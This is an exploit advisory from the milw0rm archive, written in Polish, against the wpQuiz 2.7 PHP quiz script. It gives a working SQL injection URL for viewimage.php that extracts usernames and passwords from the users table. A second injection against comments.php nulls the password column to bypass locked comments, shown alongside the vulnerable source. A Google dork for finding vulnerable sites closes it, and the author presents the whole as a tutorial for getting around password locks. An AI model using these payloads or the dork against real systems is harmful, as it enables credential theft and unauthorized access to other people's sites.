<html><head><title>wpQuiz 2.7 Multiple Remote SQL Injection Vulnerabilities</title></head><pre>Tytul: wpQuiz 2.7 Remote SQL Injection Vulnerability
### http://wireplastik.com/projects.php


Autor: Kacper
E-Mail: kacper1964@yahoo.pl
Strona: devilteam.eu

Irc: irc.myg0t.com #devilteam

Blad:


viewimage.php?id=-1'+union+select+0,1,2,3,4,5,6,7,8,9,10,11,12,concat(user,char(58),password),14,15+from+users+where+id=1/*

Pozniej sciagnij obrazek i sprawdz jego zrodlo!


==========================================================================================================================
Kolejny blad dotyczy nieautoryzowanego dostepu do komentowania wynikow na quizie.








Skopiowane prosto z =&gt; http://devilteam.eu/forum/topics92/bypass-za-pomoca-sql-wpquiz-vt4278.htm
==========================================================================================================================
Elo, ostatnio natknolem sie na ciekawy skrypt Quizowy (WpQuiz) i znalazlem w nim pare ciekawych bledow. 

w skrypcie istnieje opcja pozwalajaca na blokowanie na haslo przez administratora komentowania wynikow w quizie. 

Plik comments.php zawiera zrodlo: 
Kod:
$no = $_GET['id']; 
$setcheck = mysql_fetch_array(mysql_query(&quot;SELECT * FROM sets WHERE id='&quot;.$no.&quot;'&quot;)); 
if( mysql_affected_rows() == 0 ){ 
geterror(&quot;commentsinvalidset&quot;); 
} 
if( $setcheck['isopen'] == 0 ){ 
geterror(&quot;commentsquestionsetclosed&quot;); 
} 
if($setcheck['password'] != &quot;&quot;){ 
if( !isset($_POST['password']) || ($_POST['password'] != $setcheck['password']) ){ 
?&gt; 
&lt;form name=&quot;pwCheck&quot; action=&quot;&lt;?= $_SERVER['PHP_SELF'] ?&gt;?id=&lt;?=$no?&gt;&quot; method=&quot;post&quot;&gt; 
&lt;div class=&quot;pagehead&quot;&gt;&lt;span class=&quot;big&quot;&gt;&lt;b&gt;&lt;?=getlang(&quot;commentspasswordheader&quot;,1)?&gt;&lt;/b&gt;&lt;/span&gt;&lt;/div&gt; 
&lt;b&gt;&lt;?=getlang(&quot;commentspasswordrequest&quot;,1)?&gt;&lt;/b&gt;&lt;br /&gt; 
&lt;?=getlang(&quot;commentspassword&quot;,1)?&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt; 
&lt;input type=&quot;submit&quot; value=&quot;&lt;?=getlang(&quot;commentspasswordsubmit&quot;,1)?&gt;&quot; /&gt; 
&lt;/form&gt; 
&lt;?php 
exit; 
} 
}



jak widac: 
Kod:
if($setcheck['password'] != &quot;&quot;){



skrypt pobiera informacje z bazy danych na temat blokowania komentowania. Jesli ta opcja bedzie pusta czyli (null=0) to skrypt nie zawola o haslo. 

wiec wykonujemy zapytanie SQL dzieki linijce: 
Kod:
$no = $_GET['id']; 
$setcheck = mysql_fetch_array(mysql_query(&quot;SELECT * FROM sets WHERE id='&quot;.$no.&quot;'&quot;));



Nasze zapytanie: 
Kod:
comments.php?id=-9'+union+select+0,1,2,3,4,5,null,7,8,9,10,11,12,13/*



metoda prob i bledow doszedlem do tego ¿e kolumna numer 6 odpowiada za haslo i dalem tam null'a  

taki maly tutek mo¿e sie przydac dla tych co chca cos omijac zablokowanego na haslo  
==========================================================================================================================

//dork:&quot;Powered by wpQuiz&quot; 

Pozdrawiam

# milw0rm.com [2007-11-27]</pre></html>